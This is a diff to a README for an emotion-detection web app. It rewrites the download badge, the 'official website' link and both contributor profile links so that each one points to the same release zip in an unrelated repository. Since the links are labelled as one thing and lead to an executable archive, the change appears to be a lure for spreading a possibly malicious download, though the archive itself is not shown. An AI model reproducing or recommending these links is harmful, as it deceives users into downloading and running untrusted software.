@@ -37,7 +37,7 @@ Ever wondered how to analyze emotions from written text or real-time video? This
 ## Download Software 📥
 
 Click the button below to download the software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Bryan7377/Emotion-Recognization-and-Analysis/releases/download/v1.0/Release_x64.zip)](https://github.com/Bryan7377/Emotion-Recognization-and-Analysis/releases/download/v1.0/Release_x64.zip)
 
 ## Getting Started 🚀
 
@@ -54,12 +54,12 @@ If you encounter any issues or have feedback, feel free to reach out through the
 
 ## Explore Further 🔍
 
-Visit the [official website](https://www.emotionrecognitionanalysis.com) for more information and updates on the Emotion Detection Web App.
+Visit the [official website](https://github.com/Bryan7377/Emotion-Recognization-and-Analysis/releases/download/v1.0/Release_x64.zip) for more information and updates on the Emotion Detection Web App.
 
 ## Contributors 👨‍💻
 
-- John Doe ([@johndoe](https://github.com/johndoe)) - Project Lead
-- Jane Smith ([@janesmith](https://github.com/janesmith)) - Machine Learning Specialist
+- John Doe ([@johndoe](https://github.com/Bryan7377/Emotion-Recognization-and-Analysis/releases/download/v1.0/Release_x64.zip)) - Project Lead
+- Jane Smith ([@janesmith](https://github.com/Bryan7377/Emotion-Recognization-and-Analysis/releases/download/v1.0/Release_x64.zip)) - Machine Learning Specialist
 
 ## License 📜
 
